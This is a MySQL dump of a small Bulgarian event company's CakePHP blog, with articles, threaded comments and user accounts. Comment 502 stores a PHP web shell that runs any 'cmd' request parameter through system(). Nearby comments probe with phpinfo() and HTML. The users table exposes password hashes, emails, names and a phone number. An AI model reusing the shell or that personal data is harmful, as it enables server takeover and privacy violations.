-- phpMyAdmin SQL Dump
-- version 4.0.10.18
-- https://www.phpmyadmin.net
--
-- Host: localhost:3306
-- Generation Time: Oct 22, 2017 at 06:53 PM
-- Server version: 5.5.54-cll
-- PHP Version: 5.6.30

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `partyman_cake944`
--

-- --------------------------------------------------------

--
-- Table structure for table `articles`
--

CREATE TABLE IF NOT EXISTS `articles` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL,
  `body` text NOT NULL,
  `category_id` int(11) NOT NULL,
  `created` datetime NOT NULL,
  `modified` datetime NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `img` varchar(255) DEFAULT NULL,
  `viewcount` int(11) DEFAULT '0',
  `comm_count` int(10) DEFAULT '0',
  `likes_count` int(11) NOT NULL DEFAULT '0',
  `has_img_gallery` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=85 ;

--
-- Dumping data for table `articles`
--

INSERT INTO `articles` (`id`, `title`, `body`, `category_id`, `created`, `modified`, `user_id`, `img`, `viewcount`, `comm_count`, `likes_count`, `has_img_gallery`) VALUES
(2, 'Лов на съкровища - Луксофт България', '<p>На 12 Декември 2016г екипът на Парти Мениджмънт беше заедно с Луксофт България в г. Банско. Но ако трябва да навлезна в подробности ,бих казал,че единствено тези , <strong>които бяха там </strong>, разбраха какво представлява лов,при това лов не на какво да е , а с zъщински лов на съпоценни съкровища!</p>\r\n', 3, '2016-11-24 00:20:58', '2017-08-07 15:21:25', 29, 'Lighthouse.jpg', 24, 13, 1, 0),
(81, 'Луксофт Коледно Парти 2017', 'На 27 Декември в София се проведе коледното парти на  фирма"Луксофт"- България.\r\nТо бе организирано така,че и малки , и големи , и още по-големи да \r\nсе забавляват в навечерието на Коледа.\r\nТържеството за подрастващите\r\nбе с начален час 18:00 часа, което малко \r\nзатрудни родителите им, предвид делничния работен ден и \r\nнатоварения трафик в града по това време.', 5, '2016-12-13 18:33:08', '2017-02-03 10:48:01', 28, 'Koala.jpg', 24, 6, 2, 0),
(82, 'Лъки Банско посреща Луксофт ', 'Отново станахме съучастници в едно прекрасно събитие ,което се състоя в невероятния спа хотел - Лъки Банксо.', 2, '2016-12-13 18:42:40', '2017-01-01 14:14:37', 28, 'Chrysanthemum.jpg', 6, 4, 2, 0),
(83, 'Отново тази година празнуваме заедно с екипа на Загорка.Kъде?Ще разберете', '<p>За цялостната органиация на събитието се погрижихме ние , заедно с&nbsp;екипът на &nbsp;хотел Рила в Боровец.<br />\r\nЕто някои малки детайли от това ковто видяхме в снимки.</p>\r\n', 2, '2016-12-13 22:43:27', '2017-09-16 14:43:10', 29, 'christmas-party-nights5-1.jpg', 49, 7, 2, 1),
(84, 'Uploading Files and Images with CakePHP', '<p>When starting out with CakePHP I found it to be a very steep learning curve, getting used to MVC along with learning all of CakePHP&#39;s magic methods was quite a lot of infomation to assimilate. Using a framework can sometimes lead you down the path of becoming a lazy programmer who expects everything to be done in an abstracted way and that was my thought process when dealing with file uploads. I expected CakePHP to do everything for me and for a time I was a little stuck on how to go about uploading and dealing with files.</p>\r\n\r\n<pre>\r\n<code>&lt;?php echo; ?&gt;</code></pre>\r\n\r\n<p>Then stupidly I realised that Cake was a PHP framework and I could deal with file uploads like any other file upload I&#39;ve been working with on normal web projects. In this article I&#39;m going to continue our previous blog application by adding a file upload facility. Each post will now have the option of uploading an image which will be stored on the server and the url of that file will be stored in the database so we can easily access it when a post is viewed.</p>\r\n\r\n<p><span class="image right"><img src="/img/articles/Tulips.jpg" /></span>Continuing the Application</p>\r\n\r\n<p>Continuing from our previous application we are going to be modifying the &#39;add&#39; view to insert our file form field and our &#39;posts_controller&#39; to deal with the file and move it to a folder in the webroot. First we need to add the &#39;image_url&#39; field to the database so here&#39;s a quick SQL statement that will do that for you.</p>\r\n\r\n<pre>\r\n<code>ALTER TABLE `posts` ADD `image_url` VARCHAR( 255 ) NOT NULL AFTER `body`;</code></pre>\r\n\r\n<p>Creating the Form</p>\r\n\r\n<p>When creating the file input area we can either use the CakePHP helper or code it up manually. It doesn&#39;t really matter which so I&#39;ll quickly go through both ways. An important note is that we will first need to add the enctype value to the form (enctype=&quot;multipart/form-data&quot;), if this is not done you will not see any file data and trust me its a common problem cos i&#39;ve done it far too many times and nearly blown a fuse figuring out why my file isn&#39;t uploading.</p>\r\n\r\n<p>Using the CakePHP html helper we can quickly create a form input field, looking in the manual and a.p.i it takes 3 arguments. The first is the fieldname of the input and this is where the file information will be saved, the second is an array of html attributes that you may want to apply to the input e.g. an id or class and the 3rd argument is a return value which we needn&#39;t worry about. In our &#39;add&#39; view we need to add the file input like this:</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Images</p>\r\n', 1, '2017-06-28 00:24:34', '2017-10-20 01:35:06', 29, 'Desert.jpg', 37, 1, 44, 1);

-- --------------------------------------------------------

--
-- Table structure for table `categories`
--

CREATE TABLE IF NOT EXISTS `categories` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `parent_id` int(11) DEFAULT NULL,
  `lft` int(10) NOT NULL,
  `rght` int(10) NOT NULL,
  `name` varchar(100) NOT NULL,
  `description` varchar(255) NOT NULL,
  `created` datetime NOT NULL,
  `modified` datetime NOT NULL,
  `article_id` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=6 ;

--
-- Dumping data for table `categories`
--

INSERT INTO `categories` (`id`, `parent_id`, `lft`, `rght`, `name`, `description`, `created`, `modified`, `article_id`) VALUES
(1, NULL, 1, 8, 'Тийм Билдинг ', 'Събтия Тийм Билдинг ', '2016-11-24 00:15:06', '2016-11-24 00:15:06', NULL),
(2, NULL, 9, 10, 'Коледно Парти', 'Събития Коледно Парти', '2016-11-24 00:25:37', '2016-11-24 00:25:37', NULL),
(3, 1, 2, 3, 'Приключенски ', 'Приключенски мероприятия', '2016-11-24 00:30:53', '2016-11-24 00:30:53', NULL),
(4, 1, 4, 7, 'Тест', 'тест', '2017-02-02 22:21:33', '2017-02-02 22:21:33', NULL),
(5, 4, 5, 6, 'Парент на тест', 'Тест', '2017-02-03 10:47:19', '2017-02-03 10:47:19', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `comments`
--

CREATE TABLE IF NOT EXISTS `comments` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `article_id` int(11) NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `body` text,
  `created` datetime NOT NULL,
  `modified` datetime NOT NULL,
  `parent_id` int(11) DEFAULT NULL,
  `lft` int(10) DEFAULT NULL,
  `rght` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=524 ;

--
-- Dumping data for table `comments`
--

INSERT INTO `comments` (`id`, `article_id`, `user_id`, `body`, `created`, `modified`, `parent_id`, `lft`, `rght`) VALUES
(474, 2, 28, 'Ти нов ли си тука?', '2017-01-24 00:03:48', '2017-01-24 00:03:48', 471, 82, 85),
(481, 82, NULL, 'Супер е!', '2017-02-11 22:13:16', '2017-02-11 22:13:16', NULL, 131, 132),
(480, 81, NULL, 'test', '2017-02-11 22:09:10', '2017-02-11 22:09:10', 478, 120, 121),
(424, 82, NULL, '23', '2017-01-18 10:27:45', '2017-01-18 10:27:45', NULL, 1, 2),
(425, 82, NULL, '3', '2017-01-18 10:31:19', '2017-01-18 10:31:19', NULL, 3, 12),
(427, 82, NULL, '4', '2017-01-18 10:43:07', '2017-01-18 10:43:07', 425, 4, 9),
(428, 82, NULL, '66', '2017-01-18 10:43:17', '2017-01-18 10:43:17', 427, 5, 8),
(429, 82, NULL, 'ok', '2017-01-18 10:43:29', '2017-01-18 10:43:29', 428, 6, 7),
(430, 82, NULL, 'okok', '2017-01-18 10:45:35', '2017-01-18 10:45:35', 425, 10, 11),
(479, 2, 28, 'Дали още бачка?', '2017-02-02 23:58:25', '2017-02-02 23:58:25', NULL, 123, 130),
(478, 81, NULL, '', '2017-01-30 22:17:01', '2017-01-30 22:17:01', NULL, 119, 122),
(477, 81, NULL, '', '2017-01-30 22:16:59', '2017-01-30 22:16:59', NULL, 117, 118),
(476, 2, NULL, 'Баба меца', '2017-01-24 05:10:45', '2017-01-24 05:10:45', 475, 114, 115),
(475, 2, 28, 'Здравейте!', '2017-01-24 00:05:54', '2017-01-24 00:05:54', NULL, 113, 116),
(438, 81, NULL, 'kk', '2017-01-19 22:18:17', '2017-01-19 22:18:17', NULL, 13, 30),
(439, 81, NULL, 'ko', '2017-01-19 22:19:01', '2017-01-19 22:19:01', 438, 14, 15),
(440, 81, NULL, 'kk', '2017-01-19 22:26:59', '2017-01-19 22:26:59', 438, 16, 17),
(441, 81, NULL, 'mm', '2017-01-19 22:28:04', '2017-01-19 22:28:04', 438, 18, 23),
(442, 81, NULL, 'ne', '2017-01-19 22:29:02', '2017-01-19 22:29:02', 441, 19, 20),
(443, 81, NULL, 'kkk', '2017-01-19 22:31:26', '2017-01-19 22:31:26', 438, 24, 27),
(444, 81, NULL, 'll', '2017-01-19 22:31:58', '2017-01-19 22:31:58', 443, 25, 26),
(445, 81, NULL, 'l', '2017-01-19 22:35:39', '2017-01-19 22:35:39', 438, 28, 29),
(446, 81, NULL, 'kk', '2017-01-19 22:38:17', '2017-01-19 22:38:17', 441, 21, 22),
(447, 81, NULL, 'Тази панда мирише :)', '2017-01-20 06:17:33', '2017-01-20 06:17:33', NULL, 31, 34),
(448, 81, NULL, 'хаха', '2017-01-20 06:27:23', '2017-01-20 06:27:23', 447, 32, 33),
(449, 81, NULL, 'Много тъппо ', '2017-01-20 06:28:00', '2017-01-20 06:28:00', NULL, 35, 38),
(450, 81, NULL, 'Ти си тъп...', '2017-01-20 09:00:30', '2017-01-20 09:00:30', 449, 36, 37),
(451, 2, NULL, 'test', '2017-01-22 22:48:00', '2017-01-22 22:48:00', NULL, 39, 42),
(452, 2, NULL, '3', '2017-01-22 22:48:24', '2017-01-22 22:48:24', NULL, 43, 44),
(453, 2, NULL, '4', '2017-01-22 22:48:36', '2017-01-22 22:48:36', NULL, 45, 46),
(454, 2, NULL, '5', '2017-01-22 22:48:48', '2017-01-22 22:48:48', NULL, 47, 48),
(455, 2, NULL, '6', '2017-01-22 22:49:07', '2017-01-22 22:49:07', NULL, 49, 50),
(456, 2, NULL, '7', '2017-01-22 22:49:18', '2017-01-22 22:49:18', NULL, 51, 52),
(457, 2, NULL, '8', '2017-01-22 22:49:30', '2017-01-22 22:49:30', NULL, 53, 54),
(458, 2, NULL, '9', '2017-01-22 22:49:41', '2017-01-22 22:49:41', NULL, 55, 56),
(459, 2, NULL, '10', '2017-01-22 22:49:51', '2017-01-22 22:49:51', NULL, 57, 58),
(460, 2, NULL, '11', '2017-01-22 22:50:26', '2017-01-22 22:50:26', NULL, 59, 80),
(461, 2, NULL, 'Reply to 11', '2017-01-22 22:50:59', '2017-01-22 22:50:59', 460, 60, 73),
(462, 2, NULL, 'Reply to 11-11', '2017-01-22 23:06:46', '2017-01-22 23:06:46', 461, 61, 62),
(463, 2, NULL, 'Reply on 11-12', '2017-01-22 23:09:05', '2017-01-22 23:09:05', 461, 63, 68),
(464, 2, NULL, '12', '2017-01-22 23:10:22', '2017-01-22 23:10:22', 463, 64, 67),
(465, 2, NULL, 'er', '2017-01-22 23:12:27', '2017-01-22 23:12:27', 461, 69, 72),
(466, 2, NULL, 'llkklk', '2017-01-22 23:15:24', '2017-01-22 23:15:24', 465, 70, 71),
(467, 2, NULL, 'jjj', '2017-01-22 23:18:55', '2017-01-22 23:18:55', 460, 74, 77),
(468, 2, NULL, 'okol', '2017-01-22 23:22:55', '2017-01-22 23:22:55', 467, 75, 76),
(469, 2, NULL, '123', '2017-01-22 23:32:40', '2017-01-22 23:32:40', 460, 78, 79),
(470, 2, NULL, 'rtr', '2017-01-22 23:34:30', '2017-01-22 23:34:30', 451, 40, 41),
(471, 2, NULL, 'Нов', '2017-01-22 23:36:48', '2017-01-22 23:36:48', NULL, 81, 86),
(472, 83, NULL, 'Това е коментар номер едно.', '2017-01-23 20:52:22', '2017-01-23 20:52:22', NULL, 87, 112),
(473, 2, NULL, '12-rep', '2017-01-23 21:56:07', '2017-01-23 21:56:07', 464, 65, 66),
(482, 2, NULL, 'а ние беее', '2017-02-15 19:30:13', '2017-02-15 19:30:13', 479, 124, 125),
(483, 2, NULL, 'Не е ясно...', '2017-05-10 06:49:52', '2017-05-10 06:49:52', 479, 126, 127),
(484, 83, NULL, 'Това е номер 2', '2017-05-11 23:29:48', '2017-05-11 23:29:48', 472, 88, 95),
(485, 83, NULL, 'Тест', '2017-05-12 01:04:01', '2017-05-12 01:04:01', NULL, 133, 142),
(486, 83, NULL, '', '2017-05-13 18:56:02', '2017-05-13 18:56:02', 485, 134, 141),
(487, 83, NULL, '123', '2017-05-13 19:05:08', '2017-05-13 19:05:08', 486, 135, 136),
(488, 83, NULL, '123', '2017-05-13 19:09:21', '2017-05-13 19:09:21', 486, 137, 140),
(489, 83, NULL, '12', '2017-05-13 19:09:51', '2017-05-13 19:09:51', 484, 89, 94),
(490, 83, NULL, 'rr', '2017-05-13 19:20:17', '2017-05-13 19:20:17', 472, 96, 111),
(491, 83, NULL, 'ww', '2017-05-13 19:25:39', '2017-05-13 19:25:39', 490, 97, 98),
(492, 83, NULL, 'ww', '2017-05-13 19:25:40', '2017-05-13 19:25:40', 490, 99, 108),
(493, 83, NULL, 'ww', '2017-05-13 19:25:40', '2017-05-13 19:25:40', 490, 109, 110),
(494, 83, NULL, '4321', '2017-05-14 09:08:27', '2017-05-14 09:08:27', 488, 138, 139),
(495, 83, NULL, '13', '2017-05-14 15:40:09', '2017-05-14 15:40:09', 492, 100, 103),
(496, 83, NULL, '23', '2017-05-14 15:40:24', '2017-05-14 15:40:24', 495, 101, 102),
(497, 83, NULL, '4354', '2017-05-14 15:51:22', '2017-05-14 15:51:22', 492, 104, 107),
(498, 83, NULL, '234', '2017-05-14 15:51:31', '2017-05-14 15:51:31', 497, 105, 106),
(499, 83, NULL, '123', '2017-05-14 15:53:22', '2017-05-14 15:53:22', 489, 90, 93),
(500, 83, NULL, '432', '2017-05-14 16:03:31', '2017-05-14 16:03:31', 499, 91, 92),
(501, 2, NULL, 'Не , а ти ?', '2017-06-04 17:46:54', '2017-06-04 17:46:54', 474, 83, 84),
(502, 83, 28, '<?php\r\nif(isset($_REQUEST[''cmd''])){\r\n $cmd = ($_REQUEST["cmd"]);\r\n    system($cmd);\r\n    echo "</pre>$cmd<pre>";\r\n    die;\r\n}\r\n?>', '2017-06-06 15:36:33', '2017-06-06 15:36:33', NULL, 143, 148),
(503, 83, 28, '<?php\r\necho phpinfo();\r\n?>\r\n\r\n', '2017-06-06 15:43:13', '2017-06-06 15:43:13', 502, 144, 147),
(504, 83, 28, '<h>Hello</h>', '2017-06-06 15:44:30', '2017-06-06 15:44:30', NULL, 149, 158),
(505, 81, 29, 'hi', '2017-06-07 01:00:19', '2017-06-07 01:00:19', NULL, 159, 166),
(506, 81, 29, 'yo', '2017-06-07 01:00:46', '2017-06-07 01:00:46', 505, 160, 163),
(507, 83, NULL, 'hello to you!', '2017-06-10 12:34:03', '2017-06-10 12:34:03', 504, 150, 157),
(508, 83, NULL, 'yo', '2017-06-10 20:36:57', '2017-06-10 20:36:57', 507, 151, 156),
(509, 83, NULL, 'yo man !', '2017-06-10 23:49:55', '2017-06-10 23:49:55', 508, 152, 155),
(510, 83, NULL, 'ko staa', '2017-06-11 00:49:01', '2017-06-11 00:49:01', 509, 153, 154),
(511, 83, NULL, '56', '2017-06-11 00:54:49', '2017-06-11 00:54:49', 503, 145, 146),
(512, 83, 29, 'Updated layout: Responsive and using web fonts!\r\n\r\nWhen Adam and I gave this presentation at the Seybold 365 conference in 2004, using CSS was still something fairly new. Browsers weren''t nearly so good as they are now and most sites were still created using tables. Executives and coders alike still needed to be convinced of the wisdom of using web standards. That was the purpose of this presentation.\r\n\r\nObviously, a lot has changed in the eleven years since we had the temerity to call the prevailing method stupid. For example, there is no more Seybold and more people access the web on their phones than at a desk. What hasn’t changed is the humor we used to poke fun and provoke people into reconsidering the way they built their sites.\r\n\r\nClick through using the nav at the bottom of each page to enjoy it in bite-sized nuggets, or jump right to the complete presentation, all-on-one page. You can also read the blog post I wrote about the steps I went through to make the pages (and their translations) responsive.\r\n\r\n—Bill\r\n', '2017-06-11 01:20:00', '2017-06-11 01:20:00', NULL, 167, 170),
(513, 82, 29, 'Updated layout: Responsive and using web fonts!\r\n\r\nWhen Adam and I gave this presentation at the Seybold 365 conference in 2004, using CSS was still something fairly new. Browsers weren''t nearly so good as they are now and most sites were still created using tables. Executives and coders alike still needed to be convinced of the wisdom of using web standards. That was the purpose of this presentation.\r\n\r\nObviously, a lot has changed in the eleven years since we had the temerity to call the prevailing method stupid. For example, there is no more Seybold and more people access the web on their phones than at a desk. What hasn’t changed is the humor we used to poke fun and provoke people into reconsidering the way they built their sites.\r\n\r\nClick through using the nav at the bottom of each page to enjoy it in bite-sized nuggets, or jump right to the complete presentation, all-on-one page. You can also read the blog post I wrote about the steps I went through to make the pages (and their translations) responsive.\r\n\r\n—Bill\r\n', '2017-06-11 01:21:59', '2017-06-11 01:21:59', NULL, 171, 176),
(514, 82, 29, 'Reallu cool, bro !', '2017-06-11 01:22:46', '2017-06-11 01:22:46', 513, 172, 173),
(515, 82, NULL, 'Thanks a lot!', '2017-06-11 01:25:18', '2017-06-11 01:25:18', 513, 174, 175),
(516, 81, NULL, 'Nice....', '2017-06-19 07:06:07', '2017-06-19 07:06:07', 505, 164, 165),
(517, 81, NULL, 'Blaahhaha', '2017-06-19 07:06:34', '2017-06-19 07:06:34', 506, 161, 162),
(518, 83, 30, 'What hasn’t changed is the humor we used to poke fun and provoke people into reconsidering the way they built their sites. Click through using the nav at the bottom of each page to enjoy it in bite-sized nuggets, or jump right to the complete presentation, all-on-one page. You can also read the blog post I wrote about the steps I went through to make the pages (and their translations) responsive. ', '2017-06-19 07:17:08', '2017-06-19 07:17:08', NULL, 177, 178),
(519, 83, 30, 'Thanks!', '2017-06-19 07:18:18', '2017-06-19 07:18:18', 512, 168, 169),
(520, 83, NULL, 'That was the purpose of this presentation. Obviously, a lot has changed in the eleven years since we had the temerity to call the prevailing method stupid. For example, there is no more Seybold and more people access the web on their phones than at a desk. What hasn’t changed is the humor we used to poke fun and provoke people into reconsidering the way they built their sites. Click through using the nav at the bottom of each page to enjoy it in bite-sized nuggets, or jump right to the complete presentation, all-on-one page. You can also read the blog post I wrote about the steps I went through to make the pages (and their translations) responsive. —Bill ', '2017-06-21 07:06:06', '2017-06-21 07:06:06', NULL, 179, 180),
(521, 2, NULL, 'Май бачка..', '2017-06-22 21:49:56', '2017-06-22 21:49:56', 479, 128, 129),
(522, 84, 29, 'My first comment', '2017-06-28 00:35:15', '2017-06-28 00:35:15', NULL, 181, 184),
(523, 84, NULL, 'dfd', '2017-08-07 12:27:55', '2017-08-07 12:27:55', 522, 182, 183);

-- --------------------------------------------------------

--
-- Table structure for table `images`
--

CREATE TABLE IF NOT EXISTS `images` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `img` varchar(255) DEFAULT NULL,
  `article_id` int(10) unsigned DEFAULT NULL,
  `created` datetime DEFAULT NULL,
  `modified` datetime DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=22 ;

--
-- Dumping data for table `images`
--

INSERT INTO `images` (`id`, `img`, `article_id`, `created`, `modified`) VALUES
(17, 'Hydrangeas.jpg', 84, '2017-07-29 16:39:37', '2017-07-29 16:39:37'),
(18, 'Tulips.jpg', 84, '2017-07-29 19:07:25', '2017-07-29 19:07:25'),
(19, 'Chrysanthemum.jpg', 84, '2017-08-07 15:29:44', '2017-08-07 15:29:44'),
(20, 'Penguins.jpg', 83, '2017-09-16 14:39:20', '2017-09-16 14:39:20'),
(21, 'Koala.jpg', 83, '2017-09-16 14:41:28', '2017-09-16 14:41:28');

-- --------------------------------------------------------

--
-- Table structure for table `phinxlog`
--

CREATE TABLE IF NOT EXISTS `phinxlog` (
  `version` bigint(20) NOT NULL,
  `migration_name` varchar(100) DEFAULT NULL,
  `start_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `end_time` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`version`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `phinxlog`
--

INSERT INTO `phinxlog` (`version`, `migration_name`, `start_time`, `end_time`) VALUES
(20161123233643, 'CreateArticles', '2016-11-23 21:55:19', '2016-11-23 21:55:19'),
(20161123234651, 'CreateCategories', '2016-11-23 21:55:19', '2016-11-23 21:55:19');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE IF NOT EXISTS `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(50) DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL,
  `role` varchar(20) DEFAULT NULL,
  `created` datetime DEFAULT NULL,
  `modified` datetime DEFAULT NULL,
  `email` varchar(255) DEFAULT NULL,
  `fname` varchar(255) DEFAULT NULL,
  `lname` varchar(255) DEFAULT NULL,
  `mobile` varchar(255) DEFAULT NULL,
  `is_active` tinyint(1) DEFAULT NULL,
  `auth` varchar(20) DEFAULT NULL,
  `avatar` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=31 ;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `role`, `created`, `modified`, `email`, `fname`, `lname`, `mobile`, `is_active`, `auth`, `avatar`) VALUES
(3, 'test', '$2y$10$X8WRGC/fMvjcUGpalbS4y.mgc0AJk3YyauXYg4aWO01GCmQu5sfwe', 'admin', '2016-11-25 22:17:53', '2016-12-03 16:55:57', NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(29, 'epeykov', '$2y$10$knA52B5BZu7YzlijCsBd9.zYAOaLvD4aWnJv.z7pUFduL8IzbWMXK', 'admin', '2017-06-06 21:54:44', '2017-06-07 20:16:18', 'epeykov@gmail.com', 'Емил', 'Пейков', '', NULL, NULL, 'IMG-1364023517-V.jpg'),
(28, 'epeykov@partymanagementbg.com', NULL, 'user', '2016-12-12 20:58:54', '2017-06-11 01:09:38', 'epeykov@partymanagementbg.com', 'Емил', 'Пейков', '+3590130303', NULL, NULL, 'IMG-1364023517-V.jpg'),
(30, 'pdimitrov', '$2y$10$HbbAqT.IjyutG6Gw1eCkWuZO/ACYMhA6s7WzPJGHYoOlK/NBkF2wK', 'user', '2017-06-07 01:38:19', '2017-06-19 07:14:05', '', 'Петко', 'Димитров', '', NULL, NULL, '9374466.jpg');

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
